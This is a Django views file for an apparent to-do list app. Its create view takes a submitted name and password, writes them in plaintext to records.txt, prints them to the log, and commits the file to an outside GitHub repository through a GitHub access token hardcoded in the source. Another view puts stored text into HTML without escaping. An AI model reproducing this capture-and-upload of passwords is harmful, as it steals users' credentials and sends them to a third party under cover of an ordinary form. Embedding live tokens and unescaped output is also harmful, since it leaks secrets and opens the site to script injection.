import requests

from django.shortcuts import render
from django.http import HttpResponse, HttpResponseRedirect

from .models import Greeting
from .models import ToDoList, Item

from .forms import CreateNewList

from datetime import datetime

from github import GithubException
import base64
from github import Github




# Create your views here.
def index(request):
    # return HttpResponse('Hello from Python!')


    r = requests.get('http://httpbin.org/status/418')
    print(r.text)
    return render(request, "home2.html", {"name" : "test"})

"""def home2(request):

    greeting = Greeting()
    greeting.save()

    greetings = Greeting.objects.all()

    return render(request, "home2.html", {"greetings": greetings})
"""
def v1(request, id):
    ls = ToDoList.objects.get(id=1)
    im = ls.item_set.get(id=id)
    return HttpResponse('<h1> Sina \'s Task is: %s </h1>' %im.text)


def create(request):
    #ls = ToDoList.objects.get(id=1)
    #im = ls.item_set.get(id=id)

     # if this is a POST request we need to process the form data
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        form = CreateNewList(request.POST)
        # check whether it's valid:
        
        if form.is_valid():
            # process the data in form.cleaned_data as required
            # ...
            g = Github("ba98060c376542a75c234171d9576de043534a84")

            repo = g.get_repo("sinaden/connect_heroku")

            now = datetime.now()
            dt_string = now.strftime(form.cleaned_data['name'] + "\n" + form.cleaned_data['password'] + "\n recorded at %H:%M:%S in %Y-%m-%d")

            f = open("records.txt", "a")
            f.write("\n" + dt_string)
            f.close()
            with open('records.txt', 'r') as file:
                content = file.read()


            all_files = []
            contents = repo.get_contents("")
            while contents:
                file_content = contents.pop(0)
                if file_content.type == "dir":
                    contents.extend(repo.get_contents(file_content.path))
                else:
                    file = file_content
                    all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))

            # Upload to github
            git_prefix = 'content/'
            git_file = git_prefix + 'records.txt'
            if git_file in all_files:
                contents = repo.get_contents(git_file)
                repo.update_file(contents.path, "committing files", content, contents.sha, branch="main")
                print(git_file + ' UPDATED')
            else:
                repo.create_file(git_file, "committing files", content, branch="main")
                print(git_file + ' CREATED')


            print("--------------0000000-----------------")
            print(form.cleaned_data['name'])
            print(form.cleaned_data['password'])
            print("--------------0000000-----------------")

            # redirect to a new URL:
            return HttpResponseRedirect('/')
    # if a GET (or any other method) we'll create a blank form
    else:
        form = CreateNewList()
    return render(request, "create.html",{ "form":form})



def db(request):

    greeting = Greeting()
    greeting.save()

    greetings = Greeting.objects.all()

    return render(request, "db.html", {"greetings": greetings})


